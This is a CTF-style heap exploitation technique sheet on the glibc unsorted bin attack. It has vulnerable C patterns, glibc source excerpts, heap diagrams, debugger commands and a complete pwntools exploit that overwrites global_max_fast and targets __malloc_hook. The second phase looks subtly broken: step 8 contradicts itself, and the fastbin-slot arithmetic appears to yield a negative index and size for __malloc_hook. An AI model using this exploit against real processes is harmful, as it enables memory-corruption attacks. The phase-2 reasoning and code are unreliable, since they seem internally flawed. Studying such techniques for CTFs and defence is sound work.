---
title: "Unsorted Bin Attack - Writing a Huge libc Value Anywhere (dead in 2.29)"
category: pwn
subcategory: heap
type: technique
tags: [unsorted-bin, unsorted-bin-attack, global-max-fast, arbitrary-write, heap, uaf, fastbin, largebin-attack, io-list-all, main-arena, pwndbg, gef, pwntools, glibc]
difficulty: medium
summary: "Set a freed unsorted chunk's bk to target-0x10; the next malloc writes main_arena+0x60 there. Killed by the 2.29 `corrupted unsorted chunks` check."
when_to_use:
  - "glibc 2.23 - 2.28 and you can write the bk of a chunk in the unsorted bin"
  - "You want to enable a huge fastbin by smashing `global_max_fast`"
  - "You need to set `_IO_list_all` for a house of orange finish"
  - "A non-zero, don't-care value at a target address is enough (a flag, a counter, a size)"
tools: [pwntools, pwndbg, gef]
related: [heap-unsorted-bin-leak, heap-largebin-attack, house-orange, heap-fake-chunk, heap-version-differences]
---

## TL;DR

`_int_malloc` unlinks unsorted chunks with
`bck = victim->bk; unsorted_chunks(av)->bk = bck; bck->fd = unsorted_chunks(av);`.
Point `victim->bk` at `target - 0x10` and that last line writes `main_arena + 0x60`
into `target`. You do **not** control the value - only the location. glibc 2.29 added
`if (bck->fd != victim) malloc_printerr("malloc(): corrupted unsorted chunks 3")`,
which ends the technique; use a largebin attack instead.

## Recognise it

- glibc 2.23 / 2.27 / 2.28 (check `strings libc.so.6 | grep "GNU C Library"`).
- You can write into a chunk that is sitting in the unsorted bin (UAF edit, overflow
  into a freed neighbour, off-by-one).
- The thing you want to corrupt only needs to become "very large" or "non-zero":
  `global_max_fast`, `mp_.tcache_bins`, a length field, a `is_admin` flag.
- Follow-up target is `_IO_list_all` (house of orange) or a stack canary-adjacent counter.

## Vulnerable code shape

```c
void do_free(void) {
    int i = read_idx();
    free(ptr[i]);            /* chunk >= 0x90 and not top-adjacent -> unsorted bin */
}

void do_edit(void) {
    int i = read_idx();
    read(0, ptr[i], sz[i]);  /* 0x10 bytes is enough: fd at +0x0, bk at +0x8 */
}
```

or a plain overflow:

```c
char *a = malloc(0x88);
char *b = malloc(0x88);
free(b);                     /* b -> unsorted (after tcache is full) */
read(0, a, 0x100);           /* overflows into b's fd/bk */
```

## Theory

Targets: glibc 2.23 - 2.28 (works), 2.29+ (dead).

The relevant loop in `_int_malloc`:

```c
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
  {
    bck = victim->bk;
    ...
    /* 2.29+ ONLY: */
    if (__glibc_unlikely (bck->fd != victim))
      malloc_printerr ("malloc(): corrupted unsorted chunks 3");

    /* exact-fit small request fast path */
    if (in_smallbin_range (nb) && bck == unsorted_chunks (av) && ...)
      { ... }

    /* remove from unsorted bin */
    unsorted_chunks (av)->bk = bck;
    bck->fd = unsorted_chunks (av);          /* <-- THE WRITE */
    ...
  }
```

`bck->fd` is `*(void**)(bck + 0x10)`. If you set `victim->bk = target - 0x10`, then
`bck = target - 0x10` and the write lands exactly at `target`, storing
`unsorted_chunks(av)` = `main_arena + 0x60`.

Two things to internalise:

1. **You do not control the value.** It is always `main_arena + 0x60`, a libc pointer,
   i.e. a huge number like `0x7f2c9a1ecbe0`. So the technique is only useful when
   "very large" or "non-zero" is what you need.
2. **The unsorted bin is corrupted afterwards.** `unsorted_chunks(av)->bk` is now
   `target - 0x10`. The very next unsorted-bin operation walks into your fake chunk.
   In practice you do the write and then *immediately* do the thing it enabled - or,
   in house of orange, the corruption itself is the point (it drives the
   `_IO_list_all` overwrite).

### Why `global_max_fast` is the classic target

`global_max_fast` gates the fastbin path in `_int_free`:

```c
if ((unsigned long)(size) <= (unsigned long)(get_max_fast ()))
```

After the write it becomes `0x7f2c9a1ecbe0`, so **every** free of a
non-mmapped chunk goes to a "fastbin". `fastbin_index(size) = (size >> 4) - 2`
then indexes far outside `fastbinsY[10]`, i.e. into arbitrary `main_arena` memory and
beyond. Combined with a chosen chunk size you get an arbitrary *pointer write* into
libc - for example over `__malloc_hook` - because `fastbinsY[idx]` for a large idx
resolves to `main_arena + 0x10 + 8*idx`.

The arithmetic: to make `fastbinsY[idx]` land on address `X`,
`idx = (X - (main_arena + 0x10)) / 8`, and the chunk size you must free is
`size = (idx + 2) * 0x10`. Free a fake chunk of that size and its address is written
to `X`.

### Other targets

| target | why | version |
|--------|-----|---------|
| `global_max_fast` | enables giant fastbins -> arbitrary pointer write | 2.23-2.28 |
| `mp_.tcache_bins` | enables tcache indices far past 64 -> write into libc via `entries[]` | 2.26-2.28 |
| `_IO_list_all` | house of orange: the *corrupted* unsorted bin leaves a fake FILE reachable | 2.23 |
| app globals | "level", "is_admin", "remaining_uses" - anything that just needs to be big | any |

### Why it died

The 2.29 check `bck->fd != victim` means `target - 0x10 + 0x10` (i.e. `*target`) must
already contain `victim` before the write. If you could write `victim` to `target` you
would not need the attack. The largebin attack survives because its equivalent write
goes through `fd_nextsize`, which was not given the same validation until later (and
even then only partially).

## Attack

glibc 2.27, goal: `global_max_fast = main_arena + 0x60`, then a fastbin write to
`__malloc_hook`.

1. `alloc(0, 0x88)` -> A (index 0)
2. `alloc(1, 0x88)` -> B (guard, keeps A off the top chunk)
3. Fill tcache[0x90]: `alloc(2..8, 0x88)` then `free(2..8)` - seven entries.
4. `free(0)` - A now goes to the **unsorted bin** (tcache is full).
5. `edit(0, p64(0) + p64(GLOBAL_MAX_FAST - 0x10))` - set `A->bk`.
6. `alloc(9, 0x88)` - `_int_malloc` walks the unsorted bin, unlinks A, and executes
   `bck->fd = unsorted_chunks(av)` -> `*(global_max_fast) = main_arena + 0x60`.
   (The malloc itself returns A; the process does not crash.)
7. Now pick `idx` so `fastbinsY[idx]` overlaps `__malloc_hook - 0x8`:
   `idx = (malloc_hook - 0x8 - (main_arena + 0x10)) / 8`,
   `fake_size = (idx + 2) * 0x10`.
8. Forge a chunk of `fake_size` somewhere you control (heap is fine), free it: its
   address is written into `__malloc_hook - 0x8`... in practice you instead free a
   chunk whose *address* you want stored. The cleaner finish on 2.23-2.28 is
   the fastbin dup into `__malloc_hook - 0x23`; see `heap-fake-chunk`.

For `_IO_list_all` (house of orange) the flow is different and is documented in its own
file - there the unsorted bin attack writes `main_arena+0x60` over `_IO_list_all`, and
the *first* smallbin chunk (`main_arena + 0x68` reinterpreted as `_chain`) becomes the
fake FILE.

## Heap state

```text
step 4: A in the unsorted bin

 unsorted head (main_arena+0x60)
      fd -> A        bk -> A
 A:  +0x08 | size = 0x91 (P)            |
     +0x10 | fd = main_arena+0x60       |
     +0x18 | bk = main_arena+0x60       |


step 5: bk hijacked

 A:  +0x10 | fd = 0                     |
     +0x18 | bk = &global_max_fast-0x10 |  <-- our write


step 6: malloc(0x88) walks the bin

   victim = head->bk = A
   bck    = A->bk    = &global_max_fast - 0x10
   head->bk = bck
   bck->fd  = head          ==>  *(&global_max_fast) = main_arena + 0x60

 libc:
   global_max_fast: 0x0000000000000080  ->  0x00007f2c9a1ecbe0

 unsorted bin is now:
   head->bk = &global_max_fast - 0x10   (a fake chunk in libc; do not touch it)


step 7 geometry (fastbinsY overlay after global_max_fast is huge)

   main_arena +0x10 : fastbinsY[0]
              +0x18 : fastbinsY[1]
              ...
              +0x10+8*idx : the address you want to write to
   free(chunk of size (idx+2)*0x10)  ==>  fastbinsY[idx] = chunk
```

## Exploit

```python
#!/usr/bin/env python3
"""Unsorted bin attack on glibc 2.23 - 2.28.

Phase 1: write main_arena+0x60 over global_max_fast.
Phase 2: use the now-enormous fastbin range to drop a heap pointer into libc,
         landing a fake chunk over __malloc_hook.

Usage:
    ./exploit.py
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

SIZE = 0x88            # -> 0x90 chunk

io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(i, d):
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def lk(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


def fastbin_index(size):
    """glibc: (sz >> 4) - 2 on x86-64."""
    return (size >> 4) - 2


def size_for_fastbin_slot(main_arena, want_addr):
    """Chunk size whose fastbinsY[] slot overlaps `want_addr`."""
    idx = (want_addr - (main_arena + 0x10)) // 8
    size = (idx + 2) * 0x10
    assert fastbin_index(size) == idx
    return size, idx


# --------------------------------------------------------------- libc leak
alloc(0, SIZE, b"A" * 8)
alloc(1, 0x18, b"guard")
# saturate tcache[0x90] so the next free reaches the unsorted bin (2.26+)
for i in range(2, 9):
    alloc(i, SIZE, b"filler")
for i in range(2, 9):
    free(i)

free(0)                              # A -> unsorted bin
leak = lk(show(0))
main_arena = leak - 0x60
libc.address = main_arena - libc.sym["main_arena"]
log.success("main_arena = %#x", main_arena)
log.success("libc base  = %#x", libc.address)

gmf = libc.sym["global_max_fast"]
log.info("global_max_fast @ %#x", gmf)

# ------------------------------------------------- phase 1: the classic write
edit(0, p64(0) + p64(gmf - 0x10))    # A->bk = &global_max_fast - 0x10
alloc(10, SIZE, b"trigger")          # unlink path writes main_arena+0x60 to gmf
log.success("global_max_fast smashed -> every free is now a fastbin free")

# ------------------------------------------------- phase 2: fastbin into libc
malloc_hook = libc.sym["__malloc_hook"]
# We want the freed chunk's ADDRESS stored at __malloc_hook - 0x10 + 0x10,
# i.e. we choose the slot that overlaps __malloc_hook itself.
fake_size, idx = size_for_fastbin_slot(main_arena, malloc_hook)
log.info("fake chunk size %#x -> fastbinsY[%d] == __malloc_hook", fake_size, idx)

# Build a chunk of that size on the heap and free it. free() checks:
#   size aligned, size >= MINSIZE, and next chunk's size is sane.
alloc(11, 0x18, b"hdr")
alloc(12, fake_size - 0x10, b"body")           # a real chunk of the desired size
alloc(13, 0x18, b"tail")
free(12)                                        # fastbinsY[idx] = chunk12
log.success("heap pointer written into libc at %#x", malloc_hook)

# From here: chunk12's user data IS reachable as __malloc_hook's value, so the
# next malloc dereferences it. Put a one_gadget there beforehand if the layout
# permits, or pivot with the standard fastbin dup.
io.interactive()
```

## Variants & pitfalls

- **glibc >= 2.29 aborts** with `malloc(): corrupted unsorted chunks 3`. There is no
  bypass; move to `heap-largebin-attack`, which gives the same "write a big value"
  primitive and is alive through 2.39.
- **The value is not yours.** If the challenge needs a *specific* value, this is the
  wrong technique. It is a "make it big" primitive.
- **You get exactly one shot.** After the write the unsorted bin points into your fake
  chunk; the next allocation that walks it will read a bogus `size` and
  `malloc(): memory corruption` follows. Do the payoff immediately.
- **Exact-fit shortcut.** If your request size matches the victim exactly, the
  `in_smallbin_range` fast path returns the chunk *before* reaching the unlink write.
  Request a size that does **not** match so the loop proceeds.
- **tcache steals the chunk (2.26+).** Fill the bin with 7 chunks first, or use a
  chunk >= 0x420.
- **`global_max_fast` symbol** is exported in most builds; if not, it sits a fixed
  distance from `main_arena` (usually `main_arena - 0x...`, derive it once in gdb).
- **`fastbin_index` overflow.** `(size >> 4) - 2` with an attacker-chosen size can
  index anywhere, including *below* `main_arena`. Negative indices work too.

## Debugging

```text
pwndbg> bins                       # unsortedbin: corrupted / [corrupted] warnings here
pwndbg> p global_max_fast
pwndbg> p &global_max_fast
pwndbg> x/4gx <A_user>             # fd, bk before the trigger malloc
pwndbg> b _int_malloc
pwndbg> watch *(long*)&global_max_fast
pwndbg> p main_arena.bins[0]
pwndbg> p/x (long)&main_arena + 0x60
gef>  heap bins unsorted
```

```bash
# Confirm the version really predates the 2.29 check.
strings ./libc.so.6 | grep -m1 "GNU C Library"
strings ./libc.so.6 | grep "corrupted unsorted chunks"   # present => 2.29+, dead
```

## Tools

- `pwndbg bins` prints "corrupted" as soon as the bin is inconsistent - that is your
  confirmation the write happened.
- `how2heap unsorted_bin_attack.c` for a minimal reproducer per version.

## References

- shellphish `how2heap`: `unsorted_bin_attack.c`, `house_of_orange.c`.
- CTF Wiki, "Unsorted Bin Attack".
- glibc `malloc/malloc.c`: `_int_malloc` unsorted bin loop.
